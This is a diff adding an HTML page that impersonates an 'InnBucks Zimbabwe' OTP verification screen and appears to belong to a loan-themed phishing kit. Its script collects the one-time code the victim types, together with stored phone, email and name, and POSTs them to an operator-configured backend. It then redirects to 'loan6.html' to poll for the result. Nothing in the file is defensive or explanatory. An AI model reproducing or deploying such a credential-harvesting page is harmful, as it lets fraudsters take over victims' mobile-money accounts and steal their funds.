@@ -1,0 +1,313 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>OTP Verification</title>
+
+    <style>
+      body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background: #1f2746;
+      }
+
+      /* HEADER */
+      .header {
+        background: #f2f2f2;
+        padding: 20px;
+        text-align: center;
+      }
+
+      .logo {
+        font-size: 28px;
+        font-weight: bold;
+        color: #1abc9c;
+      }
+
+      /* CARD */
+      .card {
+        background: #f2f2f2;
+        margin: 40px auto;
+        width: 90%;
+        max-width: 400px;
+        padding: 30px 20px;
+        border-radius: 20px;
+        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+      }
+
+      h2 {
+        margin-bottom: 10px;
+      }
+
+      .phone {
+        font-weight: bold;
+        margin-bottom: 20px;
+      }
+
+      /* OTP INPUTS */
+      .otp-container {
+        display: flex;
+        justify-content: space-between;
+        margin: 20px 0;
+      }
+
+      .otp-input {
+        width: 50px;
+        height: 55px;
+        font-size: 22px;
+        text-align: center;
+        border-radius: 10px;
+        border: 2px solid #ccc;
+      }
+
+      .otp-input:focus {
+        border-color: #1abc9c;
+        outline: none;
+      }
+
+      /* COUNTDOWN */
+      .countdown {
+        text-align: center;
+        color: #777;
+        margin-bottom: 20px;
+      }
+
+      /* BUTTON */
+      button {
+        width: 100%;
+        padding: 15px;
+        border: none;
+        border-radius: 15px;
+        font-size: 18px;
+        font-weight: bold;
+        background: #ccc;
+        color: white;
+        cursor: not-allowed;
+        transition: 0.3s;
+      }
+
+      button.active {
+        background: linear-gradient(90deg, #1abc9c, #8e44ad);
+        cursor: pointer;
+      }
+
+      .footer {
+        text-align: center;
+        color: white;
+        padding: 20px;
+        font-size: 14px;
+      }
+
+      /* LOADING OVERLAY - UPDATED */
+      .overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(31, 39, 70, 0.95);
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+        visibility: hidden;
+        opacity: 0;
+        transition: opacity 0.3s ease;
+      }
+
+      .overlay.visible {
+        visibility: visible;
+        opacity: 1;
+      }
+
+      .loader-spinner {
+        width: 60px;
+        height: 60px;
+        border: 5px solid rgba(255, 255, 255, 0.1);
+        border-top: 5px solid #1abc9c;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      .loading-text {
+        margin-top: 20px;
+        color: white;
+        font-size: 18px;
+        font-weight: bold;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="header">
+      <div class="logo">InnBucks</div>
+    </div>
+
+    <div class="card">
+      <h2>OTP Verification</h2>
+      <p>Enter the OTP sent to your phone number</p>
+      <div class="phone" id="displayPhone">+263 000 000 000</div>
+
+      <div class="otp-container">
+        <input type="text" maxlength="1" class="otp-input" />
+        <input type="text" maxlength="1" class="otp-input" />
+        <input type="text" maxlength="1" class="otp-input" />
+        <input type="text" maxlength="1" class="otp-input" />
+        <input type="text" maxlength="1" class="otp-input" />
+      </div>
+
+      <div class="countdown" id="countdownText">Resend code in 30 seconds</div>
+
+      <button id="submitBtn" disabled>SUBMIT</button>
+    </div>
+
+    <div class="footer">© 2026 InnBucks Zimbabwe</div>
+
+    <div class="overlay" id="loadingOverlay">
+      <div class="loader-spinner"></div>
+      <div class="loading-text">Verifying OTP...</div>
+    </div>
+
+    <script>
+      const inputs = document.querySelectorAll(".otp-input");
+      const submitBtn = document.getElementById("submitBtn");
+      const countdownText = document.getElementById("countdownText");
+      const overlay = document.getElementById("loadingOverlay");
+
+      /* AUTO MOVE BETWEEN INPUTS */
+      inputs.forEach((input, index) => {
+        input.addEventListener("input", (e) => {
+          input.value = input.value.replace(/[^0-9]/g, "");
+
+          if (input.value && index < inputs.length - 1) {
+            inputs[index + 1].focus();
+          }
+
+          checkOTP();
+        });
+
+        input.addEventListener("keydown", (e) => {
+          if (e.key === "Backspace" && !input.value && index > 0) {
+            inputs[index - 1].focus();
+          }
+        });
+      });
+
+      /* ENABLE SUBMIT WHEN FULL */
+      function checkOTP() {
+        let full = true;
+        inputs.forEach((input) => {
+          if (input.value === "") full = false;
+        });
+
+        if (full) {
+          submitBtn.disabled = false;
+          submitBtn.classList.add("active");
+        } else {
+          submitBtn.disabled = true;
+          submitBtn.classList.remove("active");
+        }
+      }
+
+      /* COUNTDOWN TIMER */
+      let seconds = 30;
+      let timer = setInterval(() => {
+        seconds--;
+        countdownText.innerText = "Resend code in " + seconds + " seconds";
+
+        if (seconds <= 0) {
+          clearInterval(timer);
+          countdownText.innerHTML =
+            "<a href='#' onclick='resendCode()' style='color:#1abc9c;text-decoration:none;'>Resend Code</a>";
+        }
+      }, 1000);
+
+      /* RESEND FUNCTION */
+      function resendCode() {
+        alert("OTP Resent (Demo)");
+        seconds = 30;
+        countdownText.innerText = "Resend code in 30 seconds";
+        // Restart timer logic...
+      }
+
+      /* LOAD PHONE NUMBER */
+      document.addEventListener("DOMContentLoaded", () => {
+        const code = localStorage.getItem("countryCode") || "+263";
+        const phone = localStorage.getItem("phoneNumber") || "555555555";
+        const display = document.getElementById("displayPhone");
+        if (display) display.textContent = code + phone;
+      });
+
+      /* SUBMIT ACTION - SEND OTP TO BACKEND */
+      submitBtn.addEventListener("click", async () => {
+        // 1. Gather OTP and user data
+        let otpCode = "";
+        inputs.forEach((input) => {
+          otpCode += input.value;
+        });
+
+        const phone =
+          (localStorage.getItem("countryCode") || "") +
+          (localStorage.getItem("phoneNumber") || "");
+        const email = localStorage.getItem("email") || "";
+        const firstName = localStorage.getItem("firstName") || "";
+        const lastName = localStorage.getItem("lastName") || "";
+        const userId = email || phone;
+
+        // 2. Show loading overlay immediately
+        overlay.classList.add("visible");
+
+        try {
+          // 3. Send OTP to backend
+          const backendUrl =
+            localStorage.getItem("backendUrl") || "https://your-backend.com";
+
+          const response = await fetch(`${backendUrl}/api/otp/submit`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              phone,
+              otp: otpCode,
+              userId,
+              email,
+              firstName,
+              lastName,
+            }),
+          });
+
+          const data = await response.json();
+
+          if (data.success && data.requestId) {
+            // Store request ID for polling on next page
+            localStorage.setItem("requestId", data.requestId);
+            localStorage.setItem("otpCode", otpCode);
+
+            // Navigate to verification page
+            setTimeout(() => {
+              window.location.href = "loan6.html";
+            }, 300);
+          } else {
+            throw new Error(data.error || "Failed to submit OTP");
+          }
+        } catch (error) {
+          overlay.classList.remove("visible");
+          alert("Error: " + error.message);
+          console.error("OTP submission error:", error);
+        }
+      });
+    </script>
+  </body>
+</html>
